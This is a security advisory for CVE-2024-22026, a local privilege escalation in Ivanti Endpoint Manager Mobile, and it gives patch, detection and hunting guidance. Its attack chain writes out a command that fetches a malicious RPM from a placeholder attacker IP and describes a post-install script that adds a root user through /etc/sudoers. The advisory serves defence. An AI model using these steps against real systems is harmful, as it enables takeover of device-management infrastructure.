---
title: Local Privilege Escalation in Ivanti Endpoint Manager Mobile (CVE-2024-22026)
slug: 2026-10-ivanti-epmm-lpe
description: A local privilege escalation vulnerability in Ivanti EPMM, tracked as CVE-2024-22026, allows an authenticated local attacker to achieve root access by installing unsigned RPM packages via the CLI 'install rpm url' command.
date: "2026-10-02T16:37:08Z"
type: advisory
types:
  - advisory
severities:
  - low
cpes:
  - cpe:2.3:a:ivanti:endpoint_manager_mobile:*:*:*:*:*:*:*:*
tags:
  - privilege-escalation
  - vulnerability
vendors:
  - Ivanti
products:
  - Endpoint Manager Mobile (< 12.1.0.0, < 12.0.0.0, < 11.12.0.1)
mitre_ttps:
  - tactic_id: TA0004
    tactic_name: Privilege Escalation
    technique_id: T1068
    technique_name: Exploitation for Privilege Escalation
    evidence: This vulnerability allows an attacker to gain root-access by exploiting the software update process.
    confidence_band: high
cves:
  - id: CVE-2024-22026
    cvss: 6.7
    epss: 0.01096
references:
  - https://sploitus.com/exploit?id=KITPLOIT:TOOLS-GITHUB-SECUREKOMODO-CVE-2024-22026
rules:
  - title: Detect CVE-2024-22026 Exploitation - RPM Installation via CLI
    description: Detects usage of the 'install rpm url' command followed by execution of the rpm utility, a signature of CVE-2024-22026 exploitation.
    platform: sigma
    severity: high
    tactics:
      - privilege-escalation
    techniques:
      - T1068
    data_sources:
      - process_creation
      - linux
rules_count: 1
action_plan:
  priority: immediate_escalation
  owners:
    - SOC
    - IT Operations
  immediate_actions:
    - action: Patch Ivanti EPMM to versions 12.1.0.0, 12.0.0.0, or 11.12.0.1
      owner: IT Operations
      due: 24h
      evidence: Ivanti released patches to address this vulnerability.
  hunt_leads:
    - lead: Search for logs containing 'install rpm url' in command history
      technique_id: T1068
      data_needed:
        - Shell history or auditd process logs
      priority: high
      confidence: high
      disposition: hunt_now
      evidence: The CLI command is the primary trigger for exploitation.
  mitigation_plan:
    - priority: immediate
      action: Egress filtering for management interfaces
      owner: Network Security
      addresses: CVE-2024-22026
      evidence: Preventing connection to unauthorized repositories mitigates the vector.
---

CVE-2024-22026 is a local privilege escalation vulnerability affecting Ivanti Endpoint Manager Mobile (formerly MobileIron Core). The flaw resides in the CLI utility 'install rpm url', which fails to validate the authenticity or origin of RPM packages before installation. An attacker with existing low-privileged access to the system can point this utility to a remote, attacker-controlled repository containing a malicious RPM package. Upon execution, the utility invokes the native 'rpm' binary with root privileges to install the package. Because there is no signature verification or URL filtering, the system executes arbitrary scripts contained within the package's pre-install and post-install hooks, leading to full system compromise. The vulnerability is addressed in Ivanti EPMM versions 12.1.0.0, 12.0.0.0, and 11.12.0.1.

## Attack Chain

1. Attacker gains initial access to the Ivanti EPMM system as a low-privileged user via compromised credentials or other entry vectors.
2. Attacker prepares a malicious RPM package using tools such as 'fpm', embedding custom scripts in 'preinstall.sh' and 'postinstall.sh'.
3. Attacker hosts the malicious RPM package on an external web server accessible by the target appliance.
4. Attacker executes the CLI command 'install rpm url http://&lt;attacker_IP>/&lt;malicious>.rpm' within the Ivanti console.
5. The application triggers the internal process to download the package from the provided URL.
6. The system executes '/bin/rpm -Uvh *.rpm' with root privileges to perform the installation.
7. The embedded 'postinstall.sh' script executes under the root context, creating a new user and modifying '/etc/sudoers' to grant persistent root access.

## Impact

Successful exploitation results in full root-level compromise of the Ivanti EPMM appliance. Attackers can gain complete control over the device management infrastructure, potentially allowing them to bypass mobile security policies, exfiltrate sensitive configuration data, or push malicious profiles/applications to managed endpoints across the organization.

## Recommendation

1. Upgrade all Ivanti Endpoint Manager Mobile instances to version 12.1.0.0, 12.0.0.0, or 11.12.0.1 immediately to patch CVE-2024-22026.
2. Implement strict network egress filtering on management appliances to prevent unauthorized outbound connections to untrusted external repositories or web servers.
3. Deploy the Sigma rules below to detect unauthorized usage of the 'install rpm' CLI command or execution of rpm installation processes by non-administrative users.
4. Review system audit logs for unauthorized user creation or modifications to the /etc/sudoers file.
